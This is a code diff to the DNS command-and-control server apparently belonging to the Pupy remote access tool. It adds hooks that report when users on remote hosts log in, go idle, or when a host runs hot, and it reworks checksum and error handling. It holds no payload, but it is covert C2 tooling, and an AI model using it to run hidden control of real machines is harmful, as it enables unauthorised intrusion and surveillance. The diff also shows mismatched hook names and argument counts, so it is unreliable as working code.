@@ -50,7 +50,7 @@ from picocmd import (
     PupyState,
     Error, ParcelInvalidCrc,
     ParcelInvalidPayload,
-    Parcel, PackError,
+    Parcel, PackError, CustomEvent,
     from_bytes
 )
 
@@ -149,8 +149,9 @@ class Session(ExpirableObject):
         'system_info', 'system_status', 'online_status',
         'open_ports', 'egress_ports', 'commands',
         'last_nonce', 'last_qname', 'pstore_dirty', 'connected',
-        'cache',
-        '_encoder'
+        'cache', '_encoder',
+        '_pstore_dirty_reported', '_users_cnt_reported',
+        '_high_resource_usage_reported', '_user_active_reported'
     )
 
     def __init__(self, node, cid, spi, encoder, commands, timeout):
@@ -172,6 +173,11 @@ class Session(ExpirableObject):
         self.pstore_dirty = False
         self.connected = False
         self.cache = {}
+
+        self._pstore_dirty_reported = False
+        self._users_cnt_reported = None
+        self._high_resource_usage_reported = False
+        self._user_active_reported = None
 
     @property
     def encoder(self):
@@ -195,16 +201,22 @@ class DnsPingRequest(Exception):
     pass
 
 class DnsCommandServerException(Exception):
-    def __init__(self, message, nonce):
+
+    __slots__ = ('message', 'nonce', 'version', 'domain')
+
+    def __init__(self, message, nonce, version, domain):
         self.message = message
         self.nonce = nonce
+        self.version = version
+        self.domain = domain
 
     @property
     def error(self):
         return Error(self.message)
 
     def __str__(self):
-        return str(self.error)
+        return '{}: (d={} v={} n={})'.format(
+            self.message, self.nonce, self.version, self.domain)
 
     def __repr__(self):
         return repr(self.error)
@@ -283,12 +295,12 @@ class DnsCommandServerHandler(BaseResolver):
 
     def _sessions_by_nodeids(self, ids):
         return [
-            session for session in self.sessions if session.node in ids
+            session for session in self.sessions if self.sessions[session].node in ids
         ]
 
     def _nodeids_with_sessions(self, ids):
         return set([
-            session.node for session in self.sessions if session.node in ids
+            session.node for session in self.sessions if self.sessions[session].node in ids
         ])
 
     @locked
@@ -436,7 +448,7 @@ class DnsCommandServerHandler(BaseResolver):
                 session for session in self.sessions.itervalues() \
                     if session.cid == node or session.node == node or (
                         session.system_info and \
-                        (session.system_info['node'] in set(node) or
+                        (session.system_info['node'] in set(node) or \
                               str(session.system_info['external_ip']) in set(node)))
             ]
 
@@ -489,6 +501,9 @@ class DnsCommandServerHandler(BaseResolver):
 
         return content
 
+    def on_custom_event(self, eventid):
+        pass
+
     def on_connect(self, info):
         pass
 
@@ -503,6 +518,47 @@ class DnsCommandServerHandler(BaseResolver):
 
     def on_session_cleaned_up(self, session):
         pass
+
+    def on_online_status(self, session):
+        pass
+
+    def on_egress_ports(self, session):
+        pass
+
+    def on_pstore(self, session):
+        pass
+
+    def on_user_become_active(self, session):
+        pass
+
+    def on_user_become_inactive(self, session):
+        pass
+
+    def on_users_increment(self, session):
+        pass
+
+    def on_users_decrement(self, session):
+        pass
+
+    def on_hight_resource_usage(self, session):
+        pass
+
+    def encoder_from_session(self, session, version):
+        if session:
+            return session.encoder
+        elif version == 1:
+            return self.encoders[self.ENCODER_V1]
+        elif version == 2:
+            return self.encoders[self.ENCODER_V2]
+
+        raise ValueError('Unsupported version {}'.format(version))
+
+    def csum_from_session(self, session, version):
+        if version == 1:
+            return None, None
+
+        encoder = self.encoder_from_session(session, version)
+        return encoder.gen_csum, encoder.check_csum
 
     def _a_page_encoder(self, data, encoder, nonce):
         data = encoder.encode(data, nonce, symmetric=encoder.kex_completed)
@@ -525,6 +581,7 @@ class DnsCommandServerHandler(BaseResolver):
         return response
 
     def _q_page_decoder(self, data):
+        domain = data
         parts = data.split('.')
 
         if len(parts) == 0:
@@ -552,8 +609,6 @@ class DnsCommandServerHandler(BaseResolver):
         nonce = 0
         version = 1
         encoder_version = self.ENCODER_V1
-        csum_check = None
-        csum_gen = None
 
         if len(parts) == 2:
             nonce_blob, data = parts
@@ -562,6 +617,7 @@ class DnsCommandServerHandler(BaseResolver):
             if len(nonce_blob) > 4:
                 node_blob = nonce_blob[4:]
                 encoder_version = self.ENCODER_V2
+                version = 2
 
             encoder = self.encoders[encoder_version]
             session = None
@@ -574,19 +630,22 @@ class DnsCommandServerHandler(BaseResolver):
             if len(nonce_blob) > 4:
                 node_blob = nonce_blob[4:]
                 encoder_version = self.ENCODER_V2
+                version = 2
 
             session = None
             with self.lock:
                 if spi not in self.sessions:
-                    raise DnsCommandServerException('NO_SESSION', nonce)
+                    raise DnsCommandServerException(
+                        'NO_SESSION', nonce, version, data)
 
                 session = self.sessions[spi]
                 encoder = session.encoder
 
-        payload = encoder.decode(data+node_blob, nonce, symmetric=True)
-
-        logger.debug('NONCE: %08x SPI: %08x NODE_BLOB: %s',
-            nonce, spi, bool(node_blob))
+        try:
+            payload = encoder.decode(data+node_blob, nonce, symmetric=True)
+        except (ParcelInvalidPayload, ParcelInvalidCrc), e:
+            raise DnsCommandServerException(
+                e.error, nonce, version, domain)
 
         if node_blob:
             offset_node_blob = len(payload) - (1+4+2+6)
@@ -598,10 +657,11 @@ class DnsCommandServerHandler(BaseResolver):
                 raise UnknownVersion()
 
             nodeid = from_bytes(node_blob[1+4+2:1+4+2+6])
-            csum_check = encoder.check_csum
-            csum_gen = encoder.gen_csum
 
-        return payload, session, nonce, nodeid, cid, iid, version, csum_check, csum_gen
+        logger.debug('NONCE: %08x SPI: %08x NODE: %012x',
+            nonce, spi, nodeid if bool(node_blob) else 0)
+
+        return payload, session, nonce, nodeid, cid, iid, version
 
     def _new_node_from_session(self, session):
         if not session.system_info:
@@ -689,6 +749,31 @@ class DnsCommandServerHandler(BaseResolver):
             if isinstance(command, SystemStatus):
                 session.system_status = command.get_dict()
 
+                if session._users_cnt_reported is not None and \
+                  session._users_cnt_reported != session.system_status['users']:
+                    if session._users_cnt_reported > session.system_status['users']:
+                        self.on_users_decrement(session)
+                    else:
+                        self.on_users_increment(session)
+
+                session._users_cnt_reported = session.system_status['users']
+
+                if session.system_status['mem'] > 90 or session.system_status['cpu'] > 90:
+                    if not session._high_resource_usage_reported:
+                        self.on_high_resource_usage(session)
+                        session._high_resource_usage_reported = True
+                else:
+                    session._high_resource_usage_reported = False
+
+                if session._user_active_reported is not None and \
+                  session._user_active_reported != session.system_status['idle']:
+                    if session.system_status['idle']:
+                        self.on_user_become_inactive(session)
+                    else:
+                        self.on_user_become_active(session)
+
+                session._user_active_reported = session.system_status['idle']
+
             commands = session.commands
             return commands
 
@@ -714,6 +799,7 @@ class DnsCommandServerHandler(BaseResolver):
 
         elif isinstance(command, OnlineStatus) and session is not None:
             session.online_status = command.get_dict()
+            self.on_online_status(session)
 
         elif isinstance(command, ConnectablePort) and session is not None:
             if command.ip not in session.open_ports:
@@ -726,9 +812,17 @@ class DnsCommandServerHandler(BaseResolver):
             for port in command.ports:
                 session.egress_ports.add(port)
 
+            self.on_egress_ports(session)
+
         elif isinstance(command, PupyState) and session is not None:
             session.pstore_dirty = command.pstore_dirty
             session.connected = command.connected
+
+            if session.pstore_dirty and not session._pstore_dirty_reported:
+                session._pstore_dirty_reported = True
+                self.on_pstore(session)
+            elif not session.pstore_dirty:
+                session._pstore_dirty_reported = False
 
         elif isinstance(command, Ack) and (session is not None):
             if session.system_info:
@@ -784,6 +878,9 @@ class DnsCommandServerHandler(BaseResolver):
                 logger.debug('kex:key=%s', binascii.b2a_hex(key[0]))
 
             return [Kex(response)]
+        elif isinstance(command, CustomEvent):
+            logger.debug('custom event: %08x', command.eventid)
+            self.on_custom_event(command.eventid, session, node)
         elif isinstance(command, PortQuizPort):
             logger.debug('portquiz: %s', command)
         elif isinstance(command, ConnectablePort):
@@ -824,10 +921,9 @@ class DnsCommandServerHandler(BaseResolver):
         node = None
 
         version = 1
-        csum_check, csum_gen = None, None
 
         try:
-            request, session, nonce, nodeid, cid, iid, version, csum_check, csum_gen = \
+            request, session, nonce, nodeid, cid, iid, version = \
               self._q_page_decoder(qname)
 
             with self.lock:
@@ -881,9 +977,18 @@ class DnsCommandServerHandler(BaseResolver):
             if node:
                 node.alert = False
 
-            for command in Parcel.unpack(request, nonce, csum_check):
+            gen_csum, check_csum = self.csum_from_session(session, version)
+
+            try:
+                commands = Parcel.unpack(request, nonce, check_csum)
+            except ParcelInvalidCrc:
+                logger.info('Invalid Parcel CRC (qname=%s, version=%s)',
+                            qname, version)
+                return None
+
+            for command in commands:
                 for response in self._cmd_processor(
-                        command, session, node, csum_check, csum_gen):
+                        command, session, node, check_csum, gen_csum):
                     responses.append(response)
 
             if session:
@@ -892,26 +997,11 @@ class DnsCommandServerHandler(BaseResolver):
 
         except DnsCommandServerException as e:
             nonce = e.nonce
+            version = e.version
+
             responses = [e.error, Policy(self.interval, self.kex), Poll()]
-            emsg = 'Server Error: {}'.format(e)
+            emsg = 'Server Error: {} (v={})'.format(e, version)
             logger.debug(emsg)
-            if node:
-                node.warning = emsg
-
-        except ParcelInvalidPayload, e:
-            responses = [e.error]
-
-            emsg = 'Invalid Payload: {}'.format(e)
-            logger.debug(emsg)
-
-            if node:
-                node.warning = emsg
-
-        except ParcelInvalidCrc, e:
-            responses = [e.error]
-            emsg = 'Invalid CRC'
-            logger.debug(emsg)
-
             if node:
                 node.warning = emsg
 
@@ -967,11 +1057,11 @@ class DnsCommandServerHandler(BaseResolver):
             '{:08x}'.format(session.spi) if session else None
         )
 
-        encoder_version = self.ENCODER_V1 if version == 1 else self.ENCODER_V2
-        encoder = session.encoder if session else self.encoders[encoder_version]
+        encoder = self.encoder_from_session(session, version)
+        gen_csum = encoder.gen_csum if version > 1 else None
 
         try:
-            payload = Parcel(*responses).pack(nonce, csum_gen)
+            payload = Parcel(*responses).pack(nonce, gen_csum)
         except PackError, e:
             emsg = 'Could not create parcel from commands: {} (session={})'.format(
                 e, '{:08x}'.format(session.spi) if session else None)
